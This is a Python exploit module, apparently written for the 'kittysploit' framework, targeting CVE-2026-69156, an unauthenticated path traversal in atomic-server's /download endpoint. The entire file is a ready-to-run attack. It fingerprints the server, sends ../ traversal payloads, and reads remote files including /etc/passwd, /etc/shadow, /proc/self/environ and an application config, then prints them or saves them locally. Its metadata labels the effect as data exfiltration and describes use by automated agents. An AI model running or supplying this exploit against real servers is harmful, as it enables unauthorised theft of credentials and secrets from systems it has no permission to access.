#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-69156 — atomic-server unauthenticated /download path traversal."""

from __future__ import annotations

from kittysploit import *
from lib.protocols.http.atomic_server import Atomic_server
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.path_traversal import Path_traversal


class Module(Auxiliary, Http_client, Atomic_server, Path_traversal):
    __info__ = {
        "name": "atomic-server CVE-2026-69156 arbitrary file read",
        "description": (
            "Reads files via GET /download?internalId= path traversal on "
            "atomic-server < 0.39.0 (no authentication required)."
        ),
        "author": ["LLCForge", "KittySploit Team"],
        "cve": ["CVE-2026-69156"],
        "platform": Platform.LINUX,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-69156",
        ],
        "tags": ["atomic-server", "lfi", "unauth", "cve-2026-69156", "auxiliary"],
        "agent": {
            "risk": "intrusive",
            "effects": ["data_exfiltration"],
            "approval_required": True,
            "produces": ["sensitive_data", "file_read"],
            "chain": {
                "suggested_followups": [
                    "scanner/http/atomic_server_cve_2026_69156_detect",
                ],
            },
        },
    }

    port = OptPort(9883, "atomic-server HTTP(S) port", required=False)
    file_read = OptString(
        "/etc/passwd",
        "Remote absolute path to read",
        required=True,
    )
    extra_files = OptString(
        "",
        "Comma-separated extra paths after file_read",
        required=False,
        advanced=True,
    )
    traversal_depth = OptInteger(6, "Max ../ depth", required=False, advanced=True)
    output_file = OptString("", "Write first successful read to local path", required=False)
    output_limit = OptInteger(
        4096,
        "Max chars printed per file (0=full)",
        required=False,
        advanced=True,
    )

    _DEFAULT_PATHS = (
        "/etc/passwd",
        "/etc/shadow",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/home/atomic/.atomic/config.toml",
    )
    _PATCHED_VERSION = "0.39.0"

    def _targets(self) -> list[str]:
        paths: list[str] = []
        primary = str(self.file_read or "").strip()
        if primary:
            paths.append(primary)
        extra = str(self.extra_files or "").strip()
        if extra:
            paths.extend(p.strip() for p in extra.split(",") if p.strip())
        if len(paths) == 1 and paths[0] == "/etc/passwd" and not extra:
            paths = list(self._DEFAULT_PATHS)
        seen: set[str] = set()
        out: list[str] = []
        for p in paths:
            if p and p not in seen:
                seen.add(p)
                out.append(p)
        return out

    def _validate_body(self, target_path: str, body: str) -> bool:
        if not body:
            return False
        if "etc/passwd" in target_path:
            return "root:" in body or "nobody:" in body
        return len(body.strip()) > 0

    def _read_one(self, target_path: str) -> tuple[bool, str, str]:
        depth = int(self.traversal_depth or 6)
        for payload in self.dotdot_payloads(target_path, max_depth=depth):
            resp = self.as_download(payload, allow_redirects=False)
            if not resp or int(resp.status_code or 0) != 200:
                continue
            body = resp.text or ""
            if self._validate_body(target_path, body):
                return True, payload, body
        return False, "", ""

    def run(self):
        fp = self.as_fingerprint()
        if not fp.get("reachable"):
            print_error("Target unreachable")
            return False
        version = str(fp.get("version") or "")
        if version and not self.version_less_than(version, self._PATCHED_VERSION):
            print_error(f"atomic-server {version} >= {self._PATCHED_VERSION} (patched)")
            return False

        if fp.get("is_atomic"):
            print_status(f"atomic-server fingerprint OK (version={version or 'unknown'})")
        else:
            print_warning("atomic-server banner not confirmed — attempting traversal anyway")

        limit = int(self.output_limit if self.output_limit is not None else 4096)
        any_ok = False
        success_count = 0
        first_body = ""

        for target in self._targets():
            ok, payload, body = self._read_one(target)
            if not ok:
                print_error(f"Could not read {target}")
                continue
            any_ok = True
            success_count += 1
            if not first_body:
                first_body = body
            snippet = body if limit <= 0 else body[:limit]
            print_success(f"Read {target} via internalId={payload!r}")
            print_status(snippet)

        if not any_ok:
            print_error("No files read — patched or traversal blocked")
            return False

        out_path = str(self.output_file or "").strip()
        if out_path and first_body:
            try:
                with open(out_path, "w", encoding="utf-8", errors="replace") as fh:
                    fh.write(first_body)
                print_success(f"Wrote {out_path}")
            except OSError as exc:
                print_error(f"Could not write output: {exc}")

        self.set_info(severity="high", cve="CVE-2026-69156", files_read=success_count)
        return True